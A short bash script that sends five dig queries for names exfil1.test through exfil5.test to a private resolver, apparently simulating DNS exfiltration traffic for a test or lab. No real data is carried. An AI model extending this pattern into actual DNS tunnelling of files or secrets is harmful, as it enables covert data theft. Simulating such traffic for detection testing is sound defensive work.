#!/usr/bin/env bash
for i in {1..5}; do dig exfil$i.test @192.168.1.2; done
